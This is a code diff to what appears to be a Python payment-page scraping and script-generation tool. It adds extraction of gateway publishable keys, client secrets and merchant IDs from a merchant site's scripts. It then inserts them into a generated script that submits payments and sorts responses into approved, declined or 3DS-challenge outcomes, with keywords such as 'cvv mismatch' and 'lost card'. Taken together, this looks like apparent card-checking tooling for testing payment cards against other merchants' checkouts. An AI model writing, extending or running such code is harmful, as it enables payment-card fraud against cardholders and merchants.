@@ -33615,6 +33615,367 @@ def _detect_and_replicate_encryption(data: dict, js_text: str) -> list:
     return found
 
 
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 🪟  CLIENT-SIDE CONFIG EXTRACTION
+#     Scans the global window object assignments and all <script> tags to
+#     extract configuration variables, public API keys, and merchant identifiers.
+#
+#     Detects
+#     ───────
+#     • Payment gateway public keys  — Stripe pk_live/test, PayPal client_id,
+#       Braintree tokenization key, Square appId, Adyen originKey/clientKey,
+#       Authorize.Net publicClientKey, NMI tokenization key, Checkout.com pk,
+#       CyberSource merchantId, Recurly public key, Chargebee site/key,
+#       Klarna identifier, Affirm public_api_key, Afterpay merchant_id
+#     • Analytics / tag identifiers — GA4 G-XXXXX, GTM GTM-XXXXX, FB Pixel,
+#       Hotjar hjid, Segment write_key, Mixpanel token, Amplitude API key
+#     • CDN / App config objects    — window.__NEXT_DATA__, window.__NUXT__,
+#       window.appConfig, window.__APP__, window.__ENV__, window.__CONFIG__,
+#       window.Stripe, window.braintree, window.paypal config blocks
+#     • Merchant identifiers        — merchant_id, merchantId, accountId,
+#       store_id, site_id, property_id, publicKey, apiKey, clientToken
+#     • Feature flags + env vars    — NODE_ENV, REACT_APP_*, NEXT_PUBLIC_*,
+#       VUE_APP_*, VITE_*, GATSBY_*, EXPO_PUBLIC_*
+# ══════════════════════════════════════════════════════════════════════════════
+
+import re
+
+
+# ── Pre-compiled pattern registry ─────────────────────────────────────────────
+# Each entry: (label, category, regex, group_index_for_value)
+_WINCFG_PATTERNS: list[tuple[str, str, re.Pattern, int]] = [
+
+    # ── Stripe ────────────────────────────────────────────────────────────────
+    ("Stripe Publishable Key",  "payment_key",
+     re.compile(r'\b(pk_(?:live|test)_[A-Za-z0-9]{20,})\b'), 1),
+    ("Stripe Account ID",       "payment_key",
+     re.compile(r'stripeAccount\s*[=:]\s*["\'](\w{21,})["\']', re.I), 1),
+    ("Stripe Client Secret",    "payment_key",
+     re.compile(r'client_secret\s*[=:]\s*["\']((pi|seti|cs)_[A-Za-z0-9_]{20,})["\']', re.I), 1),
+
+    # ── PayPal ────────────────────────────────────────────────────────────────
+    ("PayPal Client ID",        "payment_key",
+     re.compile(r'(?:client[-_]?id|clientId)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', re.I), 1),
+    ("PayPal Merchant ID",      "merchant_id",
+     re.compile(r'paypal[^"\']{0,40}(?:merchant[-_]?id|merchantId)\s*[=:]\s*["\']([A-Za-z0-9_\-]{8,})["\']', re.I), 1),
+
+    # ── Braintree ─────────────────────────────────────────────────────────────
+    ("Braintree Tokenization Key", "payment_key",
+     re.compile(r'(?:tokenization[-_]?key|clientToken|client_token)\s*[=:]\s*["\']([A-Za-z0-9+/=_\-]{20,})["\']', re.I), 1),
+    ("Braintree Authorization",    "payment_key",
+     re.compile(r'braintree[^"\']{0,60}authorization\s*[=:]\s*["\']([A-Za-z0-9+/=_\-]{20,})["\']', re.I), 1),
+
+    # ── Square ────────────────────────────────────────────────────────────────
+    ("Square Application ID",   "payment_key",
+     re.compile(r'(?:applicationId|appId|application_id)\s*[=:]\s*["\']([A-Za-z0-9_\-]{8,})["\']', re.I), 1),
+    ("Square Location ID",      "merchant_id",
+     re.compile(r'(?:locationId|location_id)\s*[=:]\s*["\']([A-Za-z0-9]{8,})["\']', re.I), 1),
+
+    # ── Adyen ─────────────────────────────────────────────────────────────────
+    ("Adyen Origin Key",        "payment_key",
+     re.compile(r'(?:originKey|origin_key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{10,})["\']', re.I), 1),
+    ("Adyen Client Key",        "payment_key",
+     re.compile(r'(?:clientKey|client_key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{10,})["\']', re.I), 1),
+    ("Adyen Merchant Account",  "merchant_id",
+     re.compile(r'(?:merchantAccount|merchant_account)\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']', re.I), 1),
+    ("Adyen Environment",       "config",
+     re.compile(r'adyen[^"\']{0,40}environment\s*[=:]\s*["\']([A-Za-z]{4,})["\']', re.I), 1),
+
+    # ── Authorize.Net ─────────────────────────────────────────────────────────
+    ("Authorize.Net Public Client Key", "payment_key",
+     re.compile(r'publicClientKey\s*[=:]\s*["\']([A-Za-z0-9+/=_\-]{16,})["\']', re.I), 1),
+    ("Authorize.Net API Login ID",      "merchant_id",
+     re.compile(r'(?:apiLoginId|api_login_id|loginId)\s*[=:]\s*["\']([A-Za-z0-9]{4,16})["\']', re.I), 1),
+
+    # ── NMI / CollectJS ───────────────────────────────────────────────────────
+    ("NMI Tokenization Key",    "payment_key",
+     re.compile(r'(?:tokenizationKey|tokenization_key)\s*[=:]\s*["\']([A-Za-z0-9\-]{8,})["\']', re.I), 1),
+
+    # ── Checkout.com ──────────────────────────────────────────────────────────
+    ("Checkout.com Public Key", "payment_key",
+     re.compile(r'\b(pk_(?:test|sbox|live)_[A-Za-z0-9]{20,})\b'), 1),
+
+    # ── CyberSource ───────────────────────────────────────────────────────────
+    ("CyberSource Merchant ID", "merchant_id",
+     re.compile(r'cybersource[^"\']{0,60}merchantId\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']', re.I), 1),
+    ("CyberSource Org ID",      "merchant_id",
+     re.compile(r'(?:orgId|org_id)\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']', re.I), 1),
+
+    # ── Recurly ───────────────────────────────────────────────────────────────
+    ("Recurly Public Key",      "payment_key",
+     re.compile(r'recurly[^"\']{0,40}(?:publicKey|public_key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{10,})["\']', re.I), 1),
+    ("Recurly Subdomain",       "merchant_id",
+     re.compile(r'recurly[^"\']{0,40}(?:subdomain|site)\s*[=:]\s*["\']([A-Za-z0-9_\-]{3,})["\']', re.I), 1),
+
+    # ── Chargebee ─────────────────────────────────────────────────────────────
+    ("Chargebee Site",          "merchant_id",
+     re.compile(r'chargebee[^"\']{0,40}site\s*[=:]\s*["\']([A-Za-z0-9_\-]{3,})["\']', re.I), 1),
+    ("Chargebee Publishable Key","payment_key",
+     re.compile(r'chargebee[^"\']{0,40}(?:publishable_key|apiKey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{10,})["\']', re.I), 1),
+
+    # ── Klarna ────────────────────────────────────────────────────────────────
+    ("Klarna Client Identifier","merchant_id",
+     re.compile(r'klarna[^"\']{0,60}(?:client[-_]?id|identifier|merchantId)\s*[=:]\s*["\']([A-Za-z0-9_\-]{6,})["\']', re.I), 1),
+
+    # ── Affirm ────────────────────────────────────────────────────────────────
+    ("Affirm Public API Key",   "payment_key",
+     re.compile(r'(?:public_api_key|affirm[^"\']{0,30}key)\s*[=:]\s*["\']([A-Za-z0-9_]{10,})["\']', re.I), 1),
+
+    # ── Afterpay / Clearpay ───────────────────────────────────────────────────
+    ("Afterpay Merchant ID",    "merchant_id",
+     re.compile(r'afterpay[^"\']{0,60}merchant[-_]?id\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']', re.I), 1),
+
+    # ── CardPointe / CardConnect ───────────────────────────────────────────────
+    ("CardPointe Site ID",      "merchant_id",
+     re.compile(r'(?:site|merchant|mid)\s*[=:]\s*["\'](\d{7,15})["\']'), 1),
+
+    # ── Spreedly ─────────────────────────────────────────────────────────────
+    ("Spreedly Environment Key","payment_key",
+     re.compile(r'spreedly[^"\']{0,40}(?:environmentKey|environment_key|key)\s*[=:]\s*["\']([A-Za-z0-9]{20,})["\']', re.I), 1),
+
+    # ── Google Analytics / GTM ────────────────────────────────────────────────
+    ("Google Analytics 4 ID",   "analytics",
+     re.compile(r'\b(G-[A-Z0-9]{6,12})\b'), 1),
+    ("Google Tag Manager ID",   "analytics",
+     re.compile(r'\b(GTM-[A-Z0-9]{5,8})\b'), 1),
+    ("Google Analytics UA",     "analytics",
+     re.compile(r'\b(UA-\d{5,12}-\d{1,3})\b'), 1),
+    ("Google Ads Conversion ID","analytics",
+     re.compile(r'\b(AW-\d{9,12})\b'), 1),
+
+    # ── Facebook / Meta ───────────────────────────────────────────────────────
+    ("Facebook Pixel ID",       "analytics",
+     re.compile(r'fbq\s*\(\s*["\']init["\'],\s*["\'](\d{13,17})["\']'), 1),
+    ("Facebook App ID",         "analytics",
+     re.compile(r'(?:appId|fb_app_id|facebookAppId)\s*[=:]\s*["\'](\d{13,18})["\']', re.I), 1),
+
+    # ── Hotjar ────────────────────────────────────────────────────────────────
+    ("Hotjar Site ID",          "analytics",
+     re.compile(r'(?:hjid|hotjar[^"\']{0,30}id)\s*[=:,]\s*(\d{5,10})\b', re.I), 1),
+
+    # ── Segment ───────────────────────────────────────────────────────────────
+    ("Segment Write Key",       "analytics",
+     re.compile(r'(?:writeKey|write_key)\s*[=:]\s*["\']([A-Za-z0-9]{20,})["\']', re.I), 1),
+
+    # ── Mixpanel ──────────────────────────────────────────────────────────────
+    ("Mixpanel Token",          "analytics",
+     re.compile(r'mixpanel[^"\']{0,40}(?:token|init)\s*[\("\']+([A-Za-z0-9]{25,32})', re.I), 1),
+
+    # ── Amplitude ─────────────────────────────────────────────────────────────
+    ("Amplitude API Key",       "analytics",
+     re.compile(r'amplitude[^"\']{0,40}(?:apiKey|api_key)\s*[=:]\s*["\']([A-Za-z0-9]{25,32})["\']', re.I), 1),
+
+    # ── reCAPTCHA / hCaptcha / Turnstile ─────────────────────────────────────
+    ("reCAPTCHA Site Key",      "captcha",
+     re.compile(r'(?:sitekey|site_key|recaptcha[^"\']{0,20}key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{30,50})["\']', re.I), 1),
+    ("hCaptcha Site Key",       "captcha",
+     re.compile(r'hcaptcha[^"\']{0,40}(?:sitekey|site_key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{30,50})["\']', re.I), 1),
+    ("CF Turnstile Site Key",   "captcha",
+     re.compile(r'turnstile[^"\']{0,40}(?:sitekey|site_key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{30,50})["\']', re.I), 1),
+
+    # ── Window / Global config objects ────────────────────────────────────────
+    ("window.__ENV__ key",      "env_var",
+     re.compile(r'window\.__ENV__\s*=\s*\{([^}]{0,800})\}', re.I | re.S), 1),
+    ("window.__CONFIG__ key",   "env_var",
+     re.compile(r'window\.__(?:CONFIG|SETTINGS|APP_CONFIG|APP|RUNTIME_CONFIG)__\s*=\s*\{([^}]{0,800})\}', re.I | re.S), 1),
+    ("NEXT_PUBLIC_ key",        "env_var",
+     re.compile(r'NEXT_PUBLIC_([A-Z0-9_]{4,})\s*[=:]\s*["\']([^"\']{1,200})["\']'), 2),
+    ("REACT_APP_ key",          "env_var",
+     re.compile(r'REACT_APP_([A-Z0-9_]{4,})\s*[=:]\s*["\']([^"\']{1,200})["\']'), 2),
+    ("VITE_ public key",        "env_var",
+     re.compile(r'VITE_([A-Z0-9_]{4,})\s*[=:]\s*["\']([^"\']{1,200})["\']'), 2),
+    ("VUE_APP_ key",            "env_var",
+     re.compile(r'VUE_APP_([A-Z0-9_]{4,})\s*[=:]\s*["\']([^"\']{1,200})["\']'), 2),
+
+    # ── Generic merchant / API identifiers ─────────────────────────────────────
+    ("Merchant ID",             "merchant_id",
+     re.compile(r'(?<![A-Za-z])(?:merchant_id|merchantId|MERCHANT_ID)\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']'), 1),
+    ("Store / Site ID",         "merchant_id",
+     re.compile(r'(?:store_id|storeId|site_id|siteId|property_id)\s*[=:]\s*["\']([A-Za-z0-9_\-]{3,})["\']', re.I), 1),
+    ("Account ID",              "merchant_id",
+     re.compile(r'(?:account_id|accountId|ACCOUNT_ID)\s*[=:]\s*["\']([A-Za-z0-9_\-]{4,})["\']'), 1),
+    ("Public / API Key (generic)","config",
+     re.compile(r'(?:publicKey|public_key|apiKey|api_key)\s*[=:]\s*["\']([A-Za-z0-9+/=_\-\.]{12,})["\']', re.I), 1),
+
+    # ── Environment / NODE_ENV ─────────────────────────────────────────────────
+    ("NODE_ENV",                "config",
+     re.compile(r'NODE_ENV\s*[=:]\s*["\']([A-Za-z]{3,15})["\']'), 1),
+    ("App Version",             "config",
+     re.compile(r'(?:APP_VERSION|appVersion|version)\s*[=:]\s*["\']([0-9][^"\']{0,20})["\']', re.I), 1),
+    ("API Base URL",            "config",
+     re.compile(r'(?:apiUrl|api_url|API_URL|baseUrl|base_url|API_BASE)\s*[=:]\s*["\']([^"\']{8,100})["\']', re.I), 1),
+]
+
+# Script tags extractor
+_SCRIPT_TAG_RE = re.compile(
+    r'<script(?:\s[^>]*)?>(.+?)</script>',
+    re.I | re.S
+)
+
+# window.X = ... assignment extractor
+_WINDOW_ASSIGN_RE = re.compile(
+    r'(?:window|globalThis|self)\s*\.\s*([A-Za-z_$][A-Za-z0-9_$]*)\s*='
+    r'\s*(["\'{[].*?)(?:;|\n)',
+    re.S
+)
+
+# Inline JSON config blocks (e.g. __NEXT_DATA__, __NUXT__, etc.)
+_INLINE_JSON_RE = re.compile(
+    r'(?:window\.|var\s+)?(__(?:NEXT_DATA|NUXT|APP_STATE|REDUX_STATE|'
+    r'INITIAL_STATE|PRELOADED_STATE|APP_CONFIG|RUNTIME_CONFIG)__)'
+    r'\s*=\s*(\{.{0,6000}?\});',
+    re.S
+)
+
+# Known safe prefixes to skip (avoid false positives from UI code)
+_SKIP_PREFIXES = {
+    'onclick', 'onchange', 'onerror', 'onload', 'style', 'class',
+    'href', 'src', 'data-', 'aria-',
+}
+
+
+def _extract_window_config(html: str, js_text: str) -> dict:
+    """
+    Scan all <script> tags in HTML and JS text for client-side configuration.
+
+    Returns
+    -------
+    {
+      "keys":   [                        # all detected items
+          {
+            "label":    "Stripe Publishable Key",
+            "category": "payment_key",     # payment_key | merchant_id | analytics
+                                           # | captcha | env_var | config
+            "value":    "pk_live_xxxx",
+            "context":  "window.Stripe('pk_live_...')",  # surrounding 60 chars
+            "source":   "inline_script",   # inline_script | external_js
+            "env":      "live",            # live | test | unknown
+          }, ...
+      ],
+      "summary": {
+          "payment_keys":  [...],
+          "merchant_ids":  [...],
+          "analytics":     [...],
+          "env_vars":      {...},         # NEXT_PUBLIC_* / REACT_APP_* etc.
+          "window_objects": [...],        # top-level window.X= names found
+      },
+      "error": None,
+    }
+    """
+    html    = html    if isinstance(html,    str) else ""
+    js_text = js_text if isinstance(js_text, str) else ""
+
+    result_keys: list[dict] = []
+    seen_vals:   set        = set()
+
+    def _env(label: str, val: str) -> str:
+        if "live" in label.lower() or "live" in val.lower():
+            return "live"
+        if "test" in label.lower() or "test" in val.lower() or "sbox" in val.lower():
+            return "test"
+        return "unknown"
+
+    def _add(label: str, category: str, value: str,
+             context: str = "", source: str = "inline_script"):
+        value = value.strip()
+        if not value or len(value) < 3:
+            return
+        # De-duplicate on (label, value) pair
+        dedup = f"{label}::{value[:80]}"
+        if dedup in seen_vals:
+            return
+        seen_vals.add(dedup)
+        result_keys.append({
+            "label":    label,
+            "category": category,
+            "value":    value[:200],
+            "context":  context[:120],
+            "source":   source,
+            "env":      _env(label, value),
+        })
+
+    # ── 1. Collect all JS corpora to scan ──────────────────────────────────
+    corpora: list[tuple[str, str]] = []   # (text, source_label)
+
+    # Inline script blocks from HTML
+    for m in _SCRIPT_TAG_RE.finditer(html):
+        block = m.group(1)
+        if block and len(block.strip()) > 10:
+            corpora.append((block, "inline_script"))
+
+    # External JS text collected by Playwright
+    if js_text:
+        corpora.append((js_text, "external_js"))
+
+    # Full HTML too (catches meta tags, data-* attrs with keys)
+    corpora.append((html, "html_document"))
+
+    # ── 2. Run all regex patterns against each corpus ─────────────────────
+    for text, source in corpora:
+        for label, category, pat, grp in _WINCFG_PATTERNS:
+            for m in pat.finditer(text):
+                try:
+                    value   = m.group(grp).strip()
+                    start   = max(0, m.start() - 30)
+                    end     = min(len(text), m.end() + 30)
+                    context = text[start:end].replace('\n', ' ').strip()
+                    _add(label, category, value, context, source)
+                except (IndexError, AttributeError):
+                    continue
+
+    # ── 3. Extract window.X = {…} object names ──────────────────────────
+    window_objects: list[str] = []
+    seen_obj: set = set()
+    for text, _ in corpora:
+        for m in _WINDOW_ASSIGN_RE.finditer(text):
+            name = m.group(1)
+            if name not in seen_obj and name not in _SKIP_PREFIXES:
+                seen_obj.add(name)
+                window_objects.append(name)
+
+    # ── 4. Extract inline JSON state blocks ───────────────────────────────
+    for text, source in [corpora[0]] if corpora else []:  # HTML only
+        for m in _INLINE_JSON_RE.finditer(text):
+            var_name = m.group(1)
+            raw_json = m.group(2)[:3000]
+            # Scan inside the JSON blob for payment keys
+            for label, category, pat, grp in _WINCFG_PATTERNS:
+                if category not in ("payment_key", "merchant_id", "captcha"):
+                    continue
+                for im in pat.finditer(raw_json):
+                    try:
+                        val = im.group(grp).strip()
+                        _add(label, category, val,
+                             f"Inside {var_name} JSON blob", source)
+                    except (IndexError, AttributeError):
+                        continue
+
+    # ── 5. Build summary ──────────────────────────────────────────────────
+    payment_keys  = [k for k in result_keys if k["category"] == "payment_key"]
+    merchant_ids  = [k for k in result_keys if k["category"] == "merchant_id"]
+    analytics_ids = [k for k in result_keys if k["category"] == "analytics"]
+    captcha_keys  = [k for k in result_keys if k["category"] == "captcha"]
+    env_vars      = {k["label"]: k["value"] for k in result_keys if k["category"] == "env_var"}
+    config_items  = [k for k in result_keys if k["category"] == "config"]
+
+    return {
+        "keys":   result_keys,
+        "summary": {
+            "payment_keys":   payment_keys,
+            "merchant_ids":   merchant_ids,
+            "analytics":      analytics_ids,
+            "captcha_keys":   captcha_keys,
+            "env_vars":       env_vars,
+            "config_items":   config_items,
+            "window_objects": window_objects,
+            "total":          len(result_keys),
+        },
+        "error": None,
+    }
+
+
+
 def _payload_sync(url: str, progress_cb=None) -> dict:
     """Main sync — static + Playwright DOM + network intercept + subpages + 3DS/wallet + enhancements."""
     import traceback as _tb_mod
@@ -34867,6 +35228,21 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
     _safe_cb("🔐 Detecting and replicating encryption logic...")
     _encryption_info = _detect_and_replicate_encryption(_pfa_data, js_text)
 
+    # ── 🪟 Client-Side Config Extraction ──────────────────────────────
+    _safe_cb("🪟 Scanning window object + <script> tags for config/keys...")
+    _combined_js_for_cfg = (js_text or "") + "\n" + (js_html or "")
+    _window_config = _extract_window_config(
+        html    = (static_html or "") + "\n" + (js_html or ""),
+        js_text = _combined_js_for_cfg,
+    )
+    _wc_total = _window_config["summary"]["total"]
+    _wc_pay   = len(_window_config["summary"]["payment_keys"])
+    if _wc_total:
+        _safe_cb(
+            f"🪟 Window config: {_wc_total} item(s) found "
+            f"({_wc_pay} payment key(s))"
+        )
+
     return {
         'url':               url,
         'base_url':          base_url,
@@ -34921,6 +35297,7 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
                                    (static_html or "") + (js_html or ""),
                                    base_url,
                                ),
+        'window_config':     _window_config,
         'payment_flow_analysis': {
             'flow_sequence':   _flow_sequence,
             'dependencies':    _dependencies,
@@ -38529,6 +38906,11 @@ def _build_python_script(data: dict) -> str:
     recaptcha= data.get('recaptcha') or {}
     forms    = data.get('forms', []) or []
     requests_list = data.get('requests', []) or []
+    _wincfg  = data.get('window_config') or {}
+    _wc_keys = _wincfg.get('keys', []) or []
+    _wc_pay_keys = _wincfg.get('summary', {}).get('payment_keys', []) or []
+    _wc_merch    = _wincfg.get('summary', {}).get('merchant_ids',  []) or []
+    _wc_env      = _wincfg.get('summary', {}).get('env_vars',      {}) or {}
 
     # ── Find best payment form entry ──────────────────────────────────────
     _all = forms + requests_list
@@ -38802,6 +39184,51 @@ def _build_python_script(data: dict) -> str:
     sc.append('from urllib.parse import unquote, urlparse')
     sc.append('import time')
     sc.append('')
+
+    # ── Window Config block: extracted public keys / merchant IDs ─────────
+    if _wc_keys:
+        sc.append('# ══════════════════════════════════════════════════════')
+        sc.append('# 🪟 Client-Side Config — window object / <script> scan')
+        sc.append('# ══════════════════════════════════════════════════════')
+        _seen_wc_vars: set = set()
+        for _k in _wc_keys:
+            _cat = _k.get('category', '')
+            _vn  = re.sub(r'[^A-Za-z0-9_]', '_',
+                          _k['label'].upper().replace(' ', '_'))[:40]
+            if _vn in _seen_wc_vars:
+                continue
+            _seen_wc_vars.add(_vn)
+            _val = str(_k.get('value', '')).replace('"', '\\"').replace("'", "\\'")[:120]
+            _env_badge = f'  # [{_k["env"].upper()}]' if _k.get('env', 'unknown') != 'unknown' else ''
+            _src_lbl   = _k.get('source', 'script')
+            sc.append(f'{_vn} = "{_val}"{_env_badge}  # {_k["label"]} ({_src_lbl})')
+        sc.append('')
+        # ── Payment keys — used in tokenization step ────────────────────
+        if _wc_pay_keys:
+            sc.append('# ── Payment keys (use in tokenization below) ──')
+            for _pk in _wc_pay_keys[:6]:
+                _pvn = re.sub(r'[^A-Za-z0-9_]', '_',
+                              _pk['label'].upper().replace(' ', '_'))[:40]
+                _pv  = str(_pk.get('value', '')).replace('"', '\\"')[:120]
+                _pe  = f'  # [{_pk["env"].upper()}]' if _pk.get('env', 'unknown') != 'unknown' else ''
+                sc.append(f'{_pvn} = "{_pv}"{_pe}')
+            sc.append('')
+        # ── Merchant IDs ─────────────────────────────────────────────────
+        if _wc_merch:
+            sc.append('# ── Merchant / Account IDs ──')
+            for _mid in _wc_merch[:4]:
+                _mn  = re.sub(r'[^A-Za-z0-9_]', '_',
+                              _mid['label'].upper().replace(' ', '_'))[:40]
+                _mv  = str(_mid.get('value', '')).replace('"', '\\"')[:80]
+                sc.append(f'{_mn} = "{_mv}"')
+            sc.append('')
+        # ── Env vars (NEXT_PUBLIC_* / REACT_APP_* / VITE_*) ─────────────
+        if _wc_env:
+            sc.append('# ── Frontend Env Vars ──')
+            for _ek, _ev in list(_wc_env.items())[:8]:
+                _evs = str(_ev).replace('"', '\\"')[:100]
+                sc.append(f'# {_ek} = "{_evs}"')
+            sc.append('')
 
     # ── Build _SESSION_SRC string via textwrap.dedent ──────────────────────
     import textwrap as _tw
@@ -39142,12 +39569,11 @@ def _build_python_script(data: dict) -> str:
         'class ResponseAnalysisEngine:',
         '    """',
         '    Parses JSON and HTML responses and categorises the outcome into',
-        '    one of four Transaction States:',
+        '    one of three Transaction States:',
         '',
-        '      SUCCESS          — payment approved / order confirmed',
-        '      FAILURE          — card declined / error / invalid',
-        '      ACTION_REQUIRED  — 3DS challenge / OTP / redirect needed',
-        '      UNKNOWN          — cannot determine from response alone',
+        '      SUCCESS                 — payment approved / order confirmed',
+        '      FAILED                  — card declined / error / invalid',
+        '      RE_VERIFICATION_REQUIRED — 3DS challenge / OTP / redirect needed',
         '',
         '    Scoring strategy',
         '    ────────────────',
@@ -39157,10 +39583,9 @@ def _build_python_script(data: dict) -> str:
         '    """',
         '',
         '    # ── State constants ──────────────────────────────────────────',
-        '    SUCCESS         = "SUCCESS"',
-        '    FAILURE         = "FAILURE"',
-        '    ACTION_REQUIRED = "ACTION_REQUIRED"',
-        '    UNKNOWN         = "UNKNOWN"',
+        '    SUCCESS                  = "SUCCESS"',
+        '    FAILED                   = "FAILED"',
+        '    RE_VERIFICATION_REQUIRED = "RE_VERIFICATION_REQUIRED"',
         '',
         '    # ── Keyword tables  {state: [(pattern, score, label), ...]} ──',
         '    _KW: dict = {',
@@ -39177,7 +39602,7 @@ def _build_python_script(data: dict) -> str:
         '            (re.compile(r\'\\x22captured\\x22\\s*:\\s*true\',        re.I),  8, "json:captured=true"),',
         '            (re.compile(r\'\\x22network_status\\x22\\s*:\\s*\\x22approved_by_network\\x22\', re.I), 10, "stripe:network_approved"),',
         '        ],',
-        '        "FAILURE": [',
+        '        "FAILED": [',
         '            (re.compile(r"\\bdeclin(?:ed|e)",                       re.I), 10, "declined"),',
         '            (re.compile(r"\\bcard\\s+(?:was\\s+)?declined",         re.I), 10, "card declined"),',
         '            (re.compile(r"\\binvalid\\s+card",                      re.I),  9, "invalid card"),',
@@ -39190,13 +39615,13 @@ def _build_python_script(data: dict) -> str:
         '            (re.compile(r"\\bcvv?\\s+(?:mismatch|failed|invalid|incorrect)", re.I), 8, "cvv mismatch"),',
         '            (re.compile(r"\\bavs\\s+(?:mismatch|failed)",           re.I),  7, "avs mismatch"),',
         '            (re.compile(r\'\\x22status\\x22\\s*:\\s*\\x22(?:failed|failure|declined|rejected|error)\\x22\', re.I), 10, "json:status=failed"),',
-        '            (re.compile(r\'\\x22decline_code\\x22\\s*:\\s*\\x22\', re.I),  9, "stripe:decline_code"),',
-        '            (re.compile(r\'\\x22error\\x22\\s*:\\s*\\{[^}]*\\x22code\\x22\', re.I), 7, "json:error.code"),',
+        '            (re.compile(r\'\\x22decline_code\\x22\\s*:\\s*\\x22\',  re.I),  9, "stripe:decline_code"),',
+        '            (re.compile(r\'\\x22error\\x22\\s*:\\s*\\x7B[^}]*\\x22code\\x22\', re.I), 7, "json:error.code"),',
         '            (re.compile(r"\\berror\\s+code\\s*[:\\-]?\\s*\\d+",     re.I),  6, "error code"),',
         '            (re.compile(r"\\bpick\\s+up\\s+card",                   re.I),  8, "pick up card"),',
         '            (re.compile(r"\\blost\\s+card",                         re.I),  8, "lost card"),',
         '        ],',
-        '        "ACTION_REQUIRED": [',
+        '        "RE_VERIFICATION_REQUIRED": [',
         '            (re.compile(r"\\brequires?_?action\\b",                 re.I), 10, "requires_action"),',
         '            (re.compile(r"\\b3[Dd]\\s*[Ss]ecure\\b",               re.I),  9, "3DS"),',
         '            (re.compile(r"\\bthree.?d\\s*secure\\b",               re.I),  9, "3DS"),',
@@ -39208,97 +39633,98 @@ def _build_python_script(data: dict) -> str:
         '            (re.compile(r"\\bchallenge_url\\b",                     re.I),  8, "challenge_url"),',
         '            (re.compile(r"\\bredirect(?:ing)?\\s+to\\s+(?:bank|issuer|acs|3ds)", re.I), 8, "redirect to bank"),',
         '            (re.compile(r"\\botp\\b|one.?time\\s+password",         re.I),  7, "OTP"),',
-        '            (re.compile(r"\\x22next_action\\x22\\s*:\\s*\\x7B",    re.I),  9, "stripe:next_action"),',
-        '            (re.compile(r"\\x22action\\x22\\s*:\\s*\\x22redirect\\x22", re.I), 7, "json:action=redirect"),',
-        '            (re.compile(r"\\x22enrolled\\x22\\s*:\\s*\\x22Y\\x22", re.I),  8, "3DS enrolled"),',
-        '            (re.compile(r"\\x22liability_shift\\x22",               re.I),  6, "liability_shift"),',
+        '            (re.compile(r"\\bre.?verif",                            re.I),  7, "re-verification"),',
+        '            (re.compile(r\'\\x22next_action\\x22\\s*:\\s*\\x7B\',   re.I),  9, "stripe:next_action"),',
+        '            (re.compile(r\'\\x22action\\x22\\s*:\\s*\\x22redirect\\x22\', re.I), 7, "json:action=redirect"),',
+        '            (re.compile(r\'\\x22enrolled\\x22\\s*:\\s*\\x22Y\\x22\', re.I),  8, "3DS enrolled"),',
+        '            (re.compile(r\'\\x22liability_shift\\x22\',              re.I),  6, "liability_shift"),',
         '        ],',
         '    }',
         '',
         '    # ── HTTP status prior weights ─────────────────────────────────',
-        '    _HTTP_PRIORS: dict = {',
-        '        # (min_code, max_code): {state: score}',
-        '        (200, 201): {SUCCESS: 4},',
-        '        (202, 202): {ACTION_REQUIRED: 3, SUCCESS: 2},',
-        '        (301, 302): {SUCCESS: 2, ACTION_REQUIRED: 3},',
-        '        (303, 307): {ACTION_REQUIRED: 4},',
-        '        (400, 400): {FAILURE: 6},',
-        '        (401, 401): {FAILURE: 5, ACTION_REQUIRED: 3},',
-        '        (402, 402): {FAILURE: 8},          # Payment Required',
-        '        (403, 403): {FAILURE: 4},',
-        '        (404, 404): {FAILURE: 3},',
-        '        (422, 422): {FAILURE: 7},          # Unprocessable Entity',
-        '        (429, 429): {FAILURE: 3},',
-        '        (500, 599): {UNKNOWN: 2, FAILURE: 2},',
-        '    }',
+        '    _HTTP_PRIORS: list = [',
+        '        # (min_code, max_code, {state: score})',
+        '        (200, 201, {"SUCCESS": 4}),',
+        '        (202, 202, {"RE_VERIFICATION_REQUIRED": 3, "SUCCESS": 2}),',
+        '        (301, 302, {"RE_VERIFICATION_REQUIRED": 3, "SUCCESS": 2}),',
+        '        (303, 307, {"RE_VERIFICATION_REQUIRED": 4}),',
+        '        (400, 400, {"FAILED": 6}),',
+        '        (401, 401, {"FAILED": 5, "RE_VERIFICATION_REQUIRED": 3}),',
+        '        (402, 402, {"FAILED": 8}),',
+        '        (403, 403, {"FAILED": 4}),',
+        '        (404, 404, {"FAILED": 3}),',
+        '        (422, 422, {"FAILED": 7}),',
+        '        (429, 429, {"FAILED": 3}),',
+        '        (500, 599, {"FAILED": 2}),',
+        '    ]',
         '',
         '    def analyse(self, resp: "requests.Response") -> dict:',
         '        """',
-        '        Analyse a requests.Response and return a result dict:',
+        '        Analyse a requests.Response and return:',
         '        {',
-        '            "state":       "SUCCESS" | "FAILURE" | "ACTION_REQUIRED" | "UNKNOWN",',
-        '            "score":       int,           # winning score',
-        '            "http_code":   int,',
+        '            "state":        "SUCCESS" | "FAILED" | "RE_VERIFICATION_REQUIRED",',
+        '            "score":        int,',
+        '            "http_code":    int,',
         '            "content_type": str,',
-        '            "matched":     [str, ...],    # matched keyword labels',
-        '            "json":        dict | None,   # parsed JSON if available',
-        '            "summary":     str,           # human-readable one-liner',
-        '            "extra":       dict,          # gateway-specific extras',
+        '            "matched":      [str, ...],',
+        '            "json":         dict | None,',
+        '            "summary":      str,',
+        '            "extra":        dict,',
         '        }',
         '        """',
         '        result = {',
-        '            "state":       self.UNKNOWN,',
-        '            "score":       0,',
-        '            "http_code":   resp.status_code,',
+        '            "state":        self.FAILED,',
+        '            "score":        0,',
+        '            "http_code":    resp.status_code,',
         '            "content_type": resp.headers.get("content-type", "")[:60],',
-        '            "matched":     [],',
-        '            "json":        None,',
-        '            "summary":     "",',
-        '            "extra":       {},',
